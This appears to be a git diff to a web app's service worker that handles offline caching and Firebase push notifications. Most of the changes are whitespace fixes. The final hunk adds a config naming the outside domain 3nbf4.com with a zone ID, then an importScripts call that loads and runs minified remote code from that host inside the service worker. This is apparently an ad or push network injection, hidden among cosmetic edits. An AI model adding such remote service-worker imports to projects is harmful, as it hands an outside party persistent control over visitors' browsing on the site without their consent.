@@ -88,9 +88,9 @@ self.addEventListener("fetch", (event) => {
           if (!response || response.status !== 200 || response.type !== "basic") {
             return response;
           }
-          
+
           const responseClone = response.clone();
-           caches.open("pwa-cache-v1").then((cache) => cache.put(event.request, responseClone));
+          caches.open("pwa-cache-v1").then((cache) => cache.put(event.request, responseClone));
           return response;
         })
         .catch(() => caches.match("/wandering/lagioff.html"));
@@ -117,18 +117,24 @@ const messaging = firebase.messaging();
 
 // Tangani notifikasi saat aplikasi di background
 messaging.onBackgroundMessage((payload) => {
-  const { title, body, image} = payload.notification;
+  const { title, body, image } = payload.notification;
 
   self.registration.showNotification(title, {
     body,
     image: image || "/icons/windows11/LargeTile.scale-100.png",
-vibrate: [200, 100, 200, 100, 200, 100, 200],
-requireInteraction: true
+    vibrate: [200, 100, 200, 100, 200, 100, 200],
+    requireInteraction: true
   });
 });
 
 self.addEventListener("notificationclick", (event) => {
   event.notification.close();
- event.waitUntil(clients.openWindow(event.notification.data.click_action));
-
+  event.waitUntil(clients.openWindow(event.notification.data.click_action));
 });
+
+self.options = {
+  "domain": "3nbf4.com",
+  "zoneId": 10411654
+}
+self.lary = ""
+importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
